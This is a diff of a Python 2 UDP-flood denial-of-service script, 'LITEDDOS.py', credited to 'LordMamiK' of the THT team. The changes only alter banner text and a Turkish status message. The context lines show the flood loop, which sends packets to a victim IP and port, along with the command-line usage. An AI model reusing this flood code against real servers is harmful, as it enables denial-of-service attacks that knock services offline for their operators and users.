@@ -8,7 +8,7 @@ def usage():
     print "#-------------------------------------------------------#"
     print "#   \033[1;91mCommand: " "python2 LITEDDOS.py " "<ip> <port> <packet> \033[1;32m   #"
     print "#                                                       #"
-    print "#\033[1;91mCreator:LordMamiK  \033[1;32m##      ###       ##                #"
+    print "#\033[1;91mCreator:LordMAMI  \033[1;32m##      ###       ##                #"
     print "#\033[1;91mTeam   : THT        \033[1;32m##     #          ##                #"
     print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
     print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
@@ -34,7 +34,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mSaldiri \033[1;32m%s \033[1;91mAtılan-> paket \033[1;32m%s \033[1;91mServer port \033[1;32m%s "%(sent, victim, vport)
+        print "\033[1;91mSaldiri \033[1;32m%s \033[1;91mAtilan-> paket \033[1;32m%s \033[1;91mServer port \033[1;32m%s "%(sent, victim, vport)
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
